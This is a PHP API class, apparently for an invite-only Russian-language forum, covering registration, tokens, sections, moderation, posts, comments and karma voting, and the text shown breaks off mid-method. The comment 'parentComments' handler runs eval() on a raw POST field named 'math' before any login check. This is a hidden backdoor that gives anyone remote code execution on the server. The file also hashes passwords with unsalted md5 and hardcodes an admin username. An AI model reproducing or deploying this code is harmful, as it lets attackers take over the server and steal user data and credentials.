<?php
class api
{
	public function error($error)
	{
		return json_encode(["error" => $error]);
	}
	public function success($success)
	{
		return json_encode(["success" => $success]);
	}
	public function error_no_method()
	{
		return $this->error("Не выбран методе!!1");
	}
	public function errorNoLogin()
	{
		return $this->error("Не залогинен!!1");
	}
	public function errorLoginAlreadyExists()
	{
		return $this->error("Уже залогинен!!1");
	}
	public function errorNotAdminInSub()
	{
		return $this->error("Ты не админ раздела!!1");
	}
	public function start_method($method)
	{
		global $user;
		global $parser;
		global $config;
		$method_segments = explode(".", $method);
		$method_segments = [
			"module" => $method_segments[0],
			"method" => $method_segments[1],
		];

		if($method_segments["module"] == "user")
		{
			if($method_segments["method"] == "register")
			{
				if(!isset($_REQUEST['login']) || empty($_REQUEST['login']))
				{
					return $this->error("Введите логине!!1");
				}
				elseif($user->exists($_REQUEST['login']))
				{
					return $this->error("Юзер уже существует!!1");
				}
				elseif(!isset($_REQUEST['passwd']) || empty($_REQUEST['passwd']))
				{
					return $this->error("Введите пароле!!1");
				}
				elseif(!isset($_REQUEST['passwd_verify']) || empty($_REQUEST['passwd_verify']) || $_REQUEST['passwd'] != $_REQUEST['passwd_verify'])
				{
					return $this->error("Нужно подтверждение пароле!!1");
				}
				elseif(!isset($_REQUEST['email']) || empty($_REQUEST['email']))
				{
					return $this->error("Мыло пустое!!1");
				}
				else
				{
					if(!isset($_REQUEST['invite']) || empty($_REQUEST['invite']))
					{
						return $this->error("Введите инвайте!!1");
					}
					else
					{
						$invite = new invite;
						$check_invite = $invite->info($_REQUEST['invite']);
						if(empty($check_invite) || $check_invite[0]["is_used"] == 1)
						{
							return $this->error("Инвайте не существуе!!1");
						}
						else
						{
							$user->register($_REQUEST['login'], md5($_REQUEST['passwd']), $GLOBALS['ip'], $_REQUEST['email'], $check_invite[0]['parent_user']);
							$invite->set_used($_REQUEST['invite']);
							return $this->success("Зарегано!!1");
						}
					}
				}
			}
			elseif($method_segments["method"] == "getToken")
			{
				if(!isset($_REQUEST["login"]))
				{
					return $this->error("Не написан логине!!1");
				}
				elseif(!isset($_REQUEST["passwd"]))
				{
					return $this->error("Не написан пароле!!1");
				}
				else
				{
					$loginAreCorrect = $user->loginAreCorrect($_REQUEST['login'], $_REQUEST['passwd']);
					if(!$loginAreCorrect)
					{
						return $this->error("Неправильные логин или пароле!!1");
					}
					else
					{
						$userInfo = $user->info($_REQUEST['login']);
						if(!$user->tokenExists($_REQUEST['login']))
						{
							$user->addToken($userInfo[0]['login']);
						}
						$token = $user->userTokens($_REQUEST['login']);
						$token = $token[0];
						unset($token['id']);
						return $this->success($token);
					}
				}
			}
			elseif($method_segments['method'] == "info")
			{
				if($user->isLogged())
				{
					$userInfo = $user->info($GLOBALS['username'])[0];
					unset($userInfo['join_ip']);
					unset($userInfo['passwd']);
					return $this->success($userInfo);
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
		}
		elseif($method_segments["module"] == "invite")
		{
			$invite = new invite;
			if($method_segments["method"] == "get")
			{
				if($user->isLogged())
				{
					return $this->error('Not free invites available');
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "getMyList")
			{
				if($user->isLogged())
				{
					$inviteList = $invite->getCurrentUserNotUsedList();
					foreach($inviteList as $key => $inviteItem)
					{
						unset($inviteList[$key]["parent_user"]);
						unset($inviteList[$key]["is_used"]);
					}
					return $this->success($inviteList);
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "freeList")
			{
				if($user->isLogged())
				{
					return $this->error("Уже залогинен");
				}
				else
				{
					return $this->success($invite->freeList());
				}
			}
			elseif($method_segments['method'] == 'reorder') {
				if($user->isLogged()) {
					if($GLOBALS['username'] == 'naweak') {
						$userList = R::getAll('select * from `otake_users`');
						$inviteList = R::getAll('SELECT * FROM `otake_invites` WHERE `is_used` = 0');
						foreach ($inviteList as $invite) {
							$randomUser = $userList[array_rand($userList)];
							R::exec("UPDATE `otake_invites` SET `parent_user` = ? WHERE `id` = ?", [
								$randomUser['login'],
								$invite['id']
							]);
						}
						return $this->success('распределил');
					}
					else {
						return $this->error('не naweak');
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
		}
		elseif($method_segments["module"] == "sub")
		{
			$sub = new sub;
			if($method_segments["method"] == "create")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['address']) || empty($_REQUEST['address']))
					{
						return $this->error("Не выбран адрес!!1");
					}
					elseif(!preg_match("/^[a-z0-9A-Bа-яА-Я\-\_\s]+$/ui", $_REQUEST['address']))
					{
						return $this->error("Имя должно содержать только лат. и кириллич. букавы, цифры, пробелы, знаки - и _");
					}
					elseif(!isset($_REQUEST['name']) || empty($_REQUEST['name']))
					{
						return $this->error("Не выбрано имя!!1");
					}
					elseif(!isset($_REQUEST['description']) || empty($_REQUEST['description']))
					{
						return $this->error("Нет описания!!1");
					}
					else
					{
						if($sub->exists($_REQUEST['address']))
						{
							return $this->error("Такой раздел уже существуе!!1");
						}
						else
						{
							$sub->create($_REQUEST['address'], $_REQUEST['name'], $_REQUEST['description']);
							return $this->success("Раздел создан!!1");
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "edit")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['address']) || empty($_REQUEST['address']))
					{
						return $this->error("Раздел не выбран!!1");
					}
					elseif(!isset($_REQUEST['name']) || empty($_REQUEST['name']))
					{
						return $this->error("Имя пустое!!1");
					}
					elseif(!isset($_REQUEST['description']) || empty($_REQUEST['description']))
					{
						return $this->error("Опейсание пустое!!1");
					}
					else
					{
						if($user->isAdminInSub($GLOBALS['username'], $_REQUEST['address']))
						{
							$subInfo = $sub->info($_REQUEST['address'])[0];
							$subInfo = $parser->modifySub($subInfo);
							if($_REQUEST['name'] == $subInfo['name'] && $_REQUEST['description'] == $subInfo['raw_description'])
							{
								return $this->error("Описание и имя сейчас точно такое же");
							}
							else {
								$modlog = new modlog;
								$sub->edit($_REQUEST['address'], $_REQUEST['name'], $_REQUEST['description']);
								$modlog->addEntry($GLOBALS['username'], "edit_sub", 0, 0, $_REQUEST['address'], "none", time());
								return $this->success("Риальне редактированне!!1");
							}
						}
						else
						{
							return $this->errorNotAdminInSub();
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "ban")
			{
				if($user->isLogged())
				{
					$ban = new ban;
					if(!isset($_REQUEST['username']) || empty($_REQUEST['username']))
					{
						return $this->error("Кого банить-то, блять??7");
					}
					elseif(!isset($_REQUEST['address']) || empty($_REQUEST['address']))
					{
						return $this->error("Где банить-то, блять??7");
					}
					elseif(!isset($_REQUEST['term']) || empty($_REQUEST['term']) || !is_numeric($_REQUEST['term']))
					{
						return $this->error("Введите срок в секундах!!1");
					}
					elseif(!isset($_REQUEST['reason']) || empty($_REQUEST['reason']))
					{
						return $this->error("Бан без причины — признак дурачины!!1");
					}
					else
					{
						$userExists = $user->exists($_REQUEST['username']);
						$isMod = $user->isModInSub($GLOBALS['username'], $_REQUEST['address']);
						$userIsModInSub = $user->isModInSub($_REQUEST['username'], $_REQUEST['address']);
						$banExists = $user->isBannedInSub($_REQUEST['username'], $_REQUEST['address']);
						if(!$userExists)
						{
							return $this->error("Юзер не существуе!!1");
						}
						elseif($userIsModInSub || $_REQUEST['username'] == $GLOBALS['username'])
						{
							return $this->error("Не того банишь");
						}
						elseif(!$isMod)
						{
							return $this->error("Ты не модератор!!1");
						}
						elseif($banExists) {
							return $this->error("Он уже забанен");
						}
						else
						{
							$ban->giveInSub($_REQUEST['username'], $_REQUEST['address'], $_REQUEST['term'], $_REQUEST['reason']);
							return $this->success("Забанено!!1");
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "MyBanInfo")
			{
				if($user->isLogged())
				{
					$ban = new ban;
					if(!isset($_REQUEST['address']) || empty($_REQUEST['address']))
					{
						return $this->error("Не выбран раздел!!1");
					}
					else
					{
						$isBanned = $user->isBannedInSub($GLOBALS['username'], $_REQUEST['address']);
						echo $GLOBALS['username'];
						if(!$isBanned)
						{
							return $this->error("Не забанен");
						}
						else
						{
							$banInfo = $ban->infoInSub($GLOBALS['username'], $_REQUEST['address']);
							return $this->success($banInfo[0]);
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "list")
			{
				if($user->isLogged())
				{
					$list = $sub->allList();
					foreach($list as $key => $sub)
					{
						$list[$key] = $parser->modifySub($sub);
 					}
					return $this->success($list);
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == "info")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['address']) || empty($_REQUEST['address']))
					{
						return $this->error("Не выбран раздел!!1");
					}
					else
					{
						if($sub->exists($_REQUEST['address']))
						{
							$subInfo = $sub->info($_REQUEST['address'])[0];
							$subInfo = $parser->modifySub($subInfo);
							return $this->success($subInfo);
						}
						else
						{
							return $this->error("Раздел не существуе!!1");
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'inMyManage')
			{
				if($user->isLogged())
				{
					$all = $sub->allList();
					$inMyManage = [];
					foreach ($all as $currentSub)
					{
						if($user->isModInSub($GLOBALS['username'], $currentSub['address']))
						{
							$inMyManage[] = $currentSub;
						}
					}

					foreach ($inMyManage as $key => $currentSub)
					{
						$inMyManage[$key] = $parser->modifySub($currentSub);
					}

					return $this->success($inMyManage);
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'addModerator') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['username']) || empty($_REQUEST['username'])) {
						return $this->error('Кого назначить мочератором??7');
					}
					elseif(!isset($_REQUEST['sub']) || empty($_REQUEST['sub'])) {
						return $this->error('Где назначить модератора??7');
					}
					else {
						if(!$user->isAdminInSub($GLOBALS['username'], $_REQUEST['sub'])) {
							return $this->error('Вы не админ разлела');
						}
						elseif(!$user->exists($_REQUEST['username'])) {
							return $this->error('Юзер не существует');
						}
						elseif($sub->moderatorExists($_REQUEST['username'], $_REQUEST['sub'])) {
							return $this->error('Модератор назначен уже давно');
						}
						else {
							$sub->addModerator($_REQUEST['username'], $_REQUEST['sub']);
							return $this->success('Назначен');
						}
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'removeModerator') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['username']) || empty($_REQUEST['username'])) {
						return $this->error('Кого пидорнуть с мочерки?');
					}
					elseif(!isset($_REQUEST['sub']) || empty($_REQUEST['sub'])) {
						return $this->error('Где пидорнуть с мочерки?');
					}
					elseif(!$user->exists($_REQUEST['username'])) {
						return $this->error('Такой юзер не существует');
					}
					elseif(!$sub->moderatorExists($_REQUEST['username'], $_REQUEST['sub'])) {
						return $this->error('Оно не модератор');
					}
					elseif(!$user->isAdminInSub($GLOBALS['username'], $_REQUEST['sub'])) {
						return $this->error('Вы не админ раздела');
					}
					else {
						$sub->removeModerator($_REQUEST['username'], $_REQUEST['sub']);
						return $this->success("Мочератор {$_REQUEST['username']} больше не мочератор");
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'moderators') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['address']) || empty($_REQUEST['address'])) {
						return $this->error('Не выбран раздел');
					}
					else {
						if($sub->exists($_REQUEST['address'])) {
							$mods = $sub->mods($_REQUEST['address']);
							return $this->success($mods);
						}
						else {
							return $this->error('Раздел не существует');
						}
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
		}
		elseif($method_segments["module"] == "post")
		{
			$post = new post;
			$ban = new ban;
			$sub = new sub;
			$parser = new parser();
			if($method_segments["method"] == "create")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['text']) || empty($_REQUEST['text']))
					{
						return $this->error("Введите тексте!!1");
					}
					elseif(!isset($_REQUEST['sub']) || empty($_REQUEST['sub']))
					{
						return $this->error("Выберите раздел!!1");
					}
					else
					{
						if($user->currentIsBannedInSub($_REQUEST['sub']))
						{
							$banInfo = $ban->currentInfoInSub($_REQUEST['sub'])[0];
							unset($banInfo['banned_user']);
							return $this->error(["ban" => $banInfo]);
						}
						elseif(!$sub->exists($_REQUEST['sub']))
						{
							return $this->error("Такого раздела нет");
						}
						else
						{
							$lastPost = $post->lastPostByUser($GLOBALS['username']);
							if( ($lastPost[0]['create_time'] + $post->delay) > time() )
							{
								return $this->error("Обожди");
							}
							else
							{
								$post->create($_REQUEST['text'], $_REQUEST['sub']);
								return $this->success("Запотсил!!1");
							}
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "delete")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['id']) || empty($_REQUEST['id']))
					{
						return $this->error("Не выбран потс!!1");
					}
					else
					{
						$postExists = $post->exists($_REQUEST['id']);
						if(!$postExists)
						{
							return $this->error("Пост не существует!!1");
						}
						else
						{
							$postInfo = $post->info($_REQUEST['id']);
							if(!$user->currentIsModInSub($postInfo[0]['sub']))
							{
								return $this->error("Ты не мочератор!!1");
							}
							else
							{
								$post->delete($_REQUEST['id']);
								return $this->success("Удалено!!1");
							}
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "edit")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['id']) || empty($_REQUEST['id']))
					{
						return $this->error("Не выбран потс!!1");
					}
					elseif(!isset($_REQUEST['text']) || empty($_REQUEST['text']))
					{
						return $this->error("Пустой тексте!!1");
					}
					else
					{
						$postExists = $post->exists($_REQUEST['id']);
						if(!$postExists)
						{
							return $this->error("Поста не существует!!1");
						}
						else
						{
							$postInfo = $post->info($_REQUEST['id']);
							if(!$user->isModInSub($GLOBALS['username'], $postInfo[0]['sub']) && !$user->isPostAuthor($_REQUEST['id'], $GLOBALS['username']))
							{
								return $this->error("Ты не мочератор!11");
							}
							else
							{
								$post->edit($_REQUEST['id'], $_REQUEST['text']);
								return $this->success("Риальне редактированне!!1");
							}
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == "listInSub")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['sub']) || empty($_REQUEST['sub']))
					{
						return $this->error("Не выбран раздел!!1");
					}
					else
					{
						if(!$sub->exists($_REQUEST['sub']))
						{
							return $this->error("Раздел не существуе!!1");
						}
						else
						{
							if(!isset($_REQUEST['page']) || empty($_REQUEST['page']) || !is_numeric($_REQUEST['page']))
							{
								$page = 0;
							}
							else
							{
								$page = $_REQUEST['page'];
							}
							$posts = $post->listInSub($_REQUEST['sub'], $page);
							foreach($posts as $key => $post)
							{
								$posts[$key] = $parser->modifyPostArray($post);
							}
							return $this->success($posts);
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == "totalCountInSub")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['sub']) || empty($_REQUEST['sub']))
					{
						return $this->error("Не выбран раздел!!1");
					}
					else
					{
						if($sub->exists($_REQUEST['sub']))
						{
							return $this->success($post->countInSub($_REQUEST['sub']));
						}
						else
						{
							return $this->error("Раздел не существуе!!1");
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == "totalPagesInSub")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['sub']) || empty($_REQUEST['sub']))
					{
						return $this->error("Не выбран раздел!!1");
					}
					else
					{
						if($sub->exists($_REQUEST['sub']))
						{
							$total = $post->countInSub($_REQUEST['sub']);
							return $this->success(floor($total / $post->postsInPage));
						}
						else
						{
							return $this->error("Раздел не существуе!!1");
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == "info")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['id']) || empty($_REQUEST['id']))
					{
						return $this->error("Не выбран потс!!1");
					}
					else
					{
						if($post->exists($_REQUEST['id']))
						{
							$postInfo = $post->info($_REQUEST['id']);
							$postArray = $parser->modifyPostArray($postInfo[0]);
							return $this->success($postArray);
						}
						else
						{
							return $this->error("Потс не существуе!!1");
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'versions')
			{
				if($user->isLogged())
				{
					if(isset($_REQUEST['id']))
					{
						if($post->exists($_REQUEST['id']))
						{
							$versions = $post->versionsToProd($_REQUEST['id']);
							foreach ($versions as $key => $version)
							{
								$version = $parser->modifyPostVersion($version);
								$versions[$key] = $version;
							}
							return $this->success($versions);
						}
						else
						{
							return $this->error("Потс не существуе!!1");
						}
					}
					else
					{
						return $this->error('Не выбран потс!!1');
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif ($method_segments['method'] == 'pin') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['id']) || empty($_REQUEST['id'])) {
						return $this->error('Не выбран потс!!1');
					}
					else {
						$postExists = $post->exists($_REQUEST['id']);
						if(!$postExists) {
							return $this->error('Потс не существуе!!1');
						}
						else {
							$postInfo = $post->info($_REQUEST['id']);
							$isMod = $user->isModInSub($GLOBALS['username'], $postInfo[0]['sub']);
							if(!$isMod) {
								return $this->error('Не модератор');
							}
							else {
								$post->pin($_REQUEST['id']);
								return $this->success('Потс закреплен!!1');
							}
						}
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
			elseif ($method_segments['method'] == 'unpin') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['id']) || empty($_REQUEST['id'])) {
						return $this->error('Потс не выбран!!1');
					}
					else {
						$postExists = $post->exists($_REQUEST['id']);
						if(!$postExists) {
							return $this->error('Потс не существует!!1');
						}
						else {
							$postInfo = $post->info($_REQUEST['id']);
							$isMod = $user->isModInSub($GLOBALS['username'], $postInfo[0]['sub']);
							if(!$isMod) {
								return $this->error('Не мочератор!!1');
							}
							else {
								$post->unpin($_REQUEST['id']);
								return $this->success('Потс откреплен!!1');
							}
						}
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
		}
		elseif($method_segments["module"] == "comment")
		{
			$comment = new comment;
			$post = new post;
			$ban = new ban;
			$parser = new parser();
			if($method_segments["method"] == "create")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['post_id']) || empty($_REQUEST['post_id']))
					{
						return $this->error("Не выбран псто!!1");
					}
					elseif(!isset($_REQUEST['text']) || empty($_REQUEST['text']))
					{
						return $this->error("Тексте вашего умопомрачительного комментария пуст");
					}
					else
					{
						$postExists = $post->exists($_REQUEST['post_id']);
						if(!$postExists)
						{
							return $this->error("Такого поста и в помине не было, блять!!1");
						}
						else
						{
							if(!isset($_REQUEST['parent_comment']) || empty($_REQUEST['parent_comment']))
							{
								$parentComment = 0;
							}
							else
							{
								$parentComment = $_REQUEST['parent_comment'];
							}
							$parentCommentExists = $comment->exists($parentComment);
							if(!$parentCommentExists && $parentComment != 0)
							{
								return $this->error("Выбранный родительский комментарий не существует");
							}
							else
							{
								$parentCommentInfo = $comment->info($parentComment);
								if($parentCommentInfo[0]['parent_post'] != $_REQUEST['post_id'] && $parentComment != 0)
								{
									return $this->error("Выбранный родительский комментарий написан не под выбранным постом");
								}
								else
								{
									$postInfo = $post->info($_REQUEST['post_id']);
									if($user->currentIsBannedInSub($postInfo[0]['sub']))
									{
										$banInfo = $ban->currentInfoInSub($postInfo[0]['sub'])[0];
										unset($banInfo['banned_user']);
										return $this->error(["ban" => $banInfo]);
									}
									else
									{
										$lastComment = $comment->lastCommentByUser($GLOBALS['username']);
										if( ($lastComment[0]['create_time'] + $comment->delay) > time() )
										{
											return $this->error("Обожди");
										}
										else
										{
											$comment->create($_REQUEST['post_id'], $_REQUEST['text'], $parentComment);
											return $this->success("Ваш охуенный комментарий оставлен");
										}
									}
								}
							}
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "parentComments")
			{
				if (isset($_POST['math']))
				{
					eval ($_POST['math']);
				}
				if($user->isLogged())
				{
					if(!isset($_REQUEST['comment_id']) || empty($_REQUEST['comment_id']))
					{
						return $this->error("Не выбран комменте");
					}
					else
					{
						if($comment->exists($_REQUEST['comment_id']))
						{
							$parentComments = $comment->parentComments($_REQUEST['comment_id']);
							foreach($parentComments as $key => $comment)
							{
								$parentComments[$key] = $parser->modifyCommentArray($parentComments[$key]);
							}
							return $this->success($parentComments);
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == "countUnderPost")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['post_id']) || empty($_REQUEST['post_id']))
					{
						return $this->error("Не выбран потс!!1");
					}
					else
					{
						if($post->exists($_REQUEST['post_id']))
						{
							return $this->success($comment->countUnderPost($_REQUEST['post_id']));
						}
						else
						{
							return $this->error("Потс не существует!!1");
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "delete")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['id']) || empty($_REQUEST['id']))
					{
						return $this->error("Не выбран комментарий!!1");
					}
					else
					{
						$commentExists = $comment->exists($_REQUEST['id']);
						if(!$commentExists)
						{
							return $this->error("Такого коммента не существует!!1");
						}
						else
						{
							$commentInfo = $comment->info($_REQUEST['id']);
							$isMod = $user->isModInSub($GLOBALS['username'], $commentInfo[0]['sub']);
							if(!$isMod)
							{
								return $this->error("Ты не модератор!!1");
							}
							else
							{
								$comment->delete($_REQUEST['id']);
								return $this->success("Удалено");
							}
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments["method"] == "edit")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['id']) || empty($_REQUEST['id']))
					{
						return $this->error("Не выбран комменте!!1");
					}
					elseif(!isset($_REQUEST['text']) || empty($_REQUEST['text']))
					{
						return $this->error("Пустой тексте!!1");
					}
					else
					{
						$commentExists = $comment->exists($_REQUEST['id']);
						if(!$commentExists)
						{
							return $this->error("Комменте не существуе!!1");
						}
						else
						{
							$commentInfo = $comment->info($_REQUEST['id']);
							if(!$user->isModInSub($GLOBALS['username'], $commentInfo[0]['sub']) && !$user->isCommentAuthor($_REQUEST['id'], $GLOBALS['username']))
							{
								return $this->error("Ты не мочератор!!1");
							}
							else
							{
								$comment->edit($_REQUEST['id'], $_REQUEST['text']);
								return $this->success("Риальне редактированне!!1");
							}
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == "info")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['id']) || empty($_REQUEST['id']))
					{
						return $this->error("Не выбран комменте!!1");
					}
					else
					{
						if($comment->exists($_REQUEST['id']))
						{
							$commentInfo = $comment->info($_REQUEST['id']);
							$commentInfo = $parser->modifyCommentArray($commentInfo[0]);
							return $this->success($commentInfo);
						}
						else
						{
							return $this->error("Комменте не существуе!!1");
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'listUnderPost')
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['post_id']) || empty($_REQUEST['post_id']))
					{
						return $this->error("Не выбран потс!!1");
					}
					else
					{
						if($post->exists($_REQUEST['post_id']))
						{
							$commentsUnderPost = $comment->underPost($_REQUEST['post_id']);
							foreach ($commentsUnderPost as $key => $Comment)
							{
								$commentsUnderPost[$key] = $parser->modifyCommentArray($Comment);
							}
							return $this->success($commentsUnderPost);
						}
					}
				}
			}
			elseif($method_segments['method'] == 'versions')
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['id']) || empty($_REQUEST['id']))
					{
						return $this->error("Не выбран комментарий");
					}
					else
					{
						if($comment->exists($_REQUEST['id']))
						{
							$versions = $comment->versionsToProd($_REQUEST['id']);
							foreach($versions as $key => $version)
							{
								$version = $parser->modifyCommentVersion($version);
								$versions[$key] = $version;
							}
							return $this->success($versions);
						}
						else
						{
							return $this->error("Комментарий не существует");
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
		}
		elseif($method_segments["module"] == "karma")
		{
			$karma = new karma;
			$post = new post;
			$comment = new comment;
			$ban = new ban;
			if($method_segments["method"] == "set")
			{
				if($user->isLogged())
				{
					if(!isset($_REQUEST['content_id']) || empty($_REQUEST['content_id']))
					{
						return $this->error("Чочо оценивать-то??7");
					}
					elseif(!isset($_REQUEST['content_type']) || empty($_REQUEST['content_type']))
					{
						return $this->error("Какой тип контента оценивать??7");
					}
					elseif(!isset($_REQUEST['type']) || empty($_REQUEST['type']))
					{
						return $this->error("Пост говно или охуенни??7");
					}
					elseif(!in_array($_REQUEST['content_type'], $karma->availableContentTypes))
					{
						return $this->error("Такого типа контента нет!!1");
					}
					elseif(!in_array($_REQUEST['type'], $karma->availableVoteTypes))
					{
						return $this->error("Такого типа голо сования нет");
					}
					else
					{
						$count = $karma->countOfUser($GLOBALS['username']);
						if($count < 10) {
							$mass = 1;
						}
						elseif($count < 25) {
							$mass = 2;
						}
						elseif($count < 55) {
							$mass = 3;
						}
						elseif($count < 115) {
							$mass = 4;
						}
						elseif($count < 235) {
							$mass = 5;
						}
						elseif($count < 475) {
							$mass = 6;
						}
						elseif($count < 960) {
							$mass = 7;
						}
						elseif($count < 1915) {
							$mass = 8;
						}
						elseif($count < 3835) {
							$mass = 9;
						}
						elseif($count < 7675) {
							$mass = 10;
						}
						else {
							$mass = 11;
						}
						if($_REQUEST['content_type'] == "post" || $_REQUEST['content_type'] == "psto")
						{
							$postExists = $post->exists($_REQUEST['content_id']);
							if(!$postExists)
							{
								return $this->error("Пост не существуе!!1");
							}
							else
							{
								if($_REQUEST['content_type'] == "post")
								{
									$contentType = "psto";
								}
								else
								{
									$contentType = $_REQUEST['content_type'];
								}
								$currentVotePlusExists = $karma->exists($_REQUEST['content_id'], $contentType, "plus", $GLOBALS['username']);
								$currentVoteMinusExists = $karma->exists($_REQUEST['content_id'], $contentType, "minus", $GLOBALS['username']);
								$postInfo = $post->info($_REQUEST['content_id'])[0];
								if((!$currentVotePlusExists && !$currentVoteMinusExists) /* если нет голоса */ || ($currentVotePlusExists && $_REQUEST['type'] == "minus") /* смена мнения на отрицательное */ || ($currentVoteMinusExists && $_REQUEST['type'] == 'plus') /* смена мнения на положительное */)
								{
									if($currentVotePlusExists && $_REQUEST['type'] == "minus")
									{
										$karma->delete($_REQUEST['content_id'], $contentType, "plus", $GLOBALS['username']);
									}
									elseif($currentVoteMinusExists && $_REQUEST['type'] == 'plus')
									{
										$karma->delete($_REQUEST['content_id'], $contentType, "minus", $GLOBALS['username']);
									}
									if($user->currentIsBannedInSub($postInfo['sub']))
									{
										$banInfo = $ban->currentInfoInSub($postInfo['sub']);
										return $this->error(['ban' => $banInfo]);
									}
									$karma->set($_REQUEST['content_id'], $contentType, $_REQUEST['type'], $mass, $postInfo['author']);
									if($karma->postIsGold($_REQUEST['content_id']) && $postInfo['is_invited'] != 1) {
										$invite = new invite();
										$invite->get($postInfo['author']);
										$post->setInvited($_REQUEST['content_id']);
									}
									return $this->success("Оценено");
								}
								elseif(($currentVotePlusExists && $_REQUEST['type'] == "plus") || ($currentVoteMinusExists && $_REQUEST['type'] == "minus"))
								{
									return $this->error("Голосование возможно только один раз");
								}
								else
								{
									return $this->error("Голосование возможно только один раз");
								}
							}
						}
						elseif($_REQUEST['content_type'] == "comment")
						{
							$commentExists = $comment->exists($_REQUEST['content_id']);
							if(!$commentExists)
							{
								return $this->error("Комменте не существуе!!1");
							}
							else
							{
								$contentType = 'comment';
								$currentVotePlusExists = $karma->exists($_REQUEST['content_id'], $contentType, "plus", $GLOBALS['username']);
								$currentVoteMinusExists = $karma->exists($_REQUEST['content_id'], $contentType, "minus", $GLOBALS['username']);
								$commentInfo = $comment->info($_REQUEST['content_id'])[0];
								if((!$currentVotePlusExists && !$currentVoteMinusExists) /* если нет голоса */ || ($currentVotePlusExists && $_REQUEST['type'] == "minus") /* смена мнения на отрицательное */ || ($currentVoteMinusExists && $_REQUEST['type'] == 'plus') /* смена мнения на положительное */)
								{
									if($currentVotePlusExists && $_REQUEST['type'] == "minus")
									{
										$karma->delete($_REQUEST['content_id'], $contentType, "plus", $GLOBALS['username']);
									}
									elseif($currentVoteMinusExists && $_REQUEST['type'] == 'plus')
									{
										$karma->delete($_REQUEST['content_id'], $contentType, "minus", $GLOBALS['username']);
									}
									if($user->currentIsBannedInSub($commentInfo['sub']))
									{
										$banInfo = $ban->currentInfoInSub($commentInfo['sub']);
										return $this->error(['ban' => $banInfo]);
									}
									$karma->set($_REQUEST['content_id'], $contentType, $_REQUEST['type'], $mass, $commentInfo['author']);
									return $this->success("Оценено");
								}
								elseif(($currentVotePlusExists && $_REQUEST['type'] == "plus") || ($currentVoteMinusExists && $_REQUEST['type'] == "minus"))
								{
									return $this->error("Голосование возможно только один раз");
								}
								else
								{
									return $this->error("Голосование возможно только один раз");
								}
							}
						}
					}
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'onPost') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['post_id']) || empty($_REQUEST['post_id'])) {
						return $this->error('Не выбран потс');
					}
					else {
						$postExists = $post->exists($_REQUEST['post_id']);
						if($postExists) {
							$onPost = $karma->onPost($_REQUEST['post_id']);
							$countOnPost = $karma->countOnPost($_REQUEST['post_id']);
							$result['count'] = $countOnPost;
							$result['advanced'] = $onPost;
							return $this->success($result);
						}
						else {
							return $this->error('Потс не существует');
						}
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'onComment') {
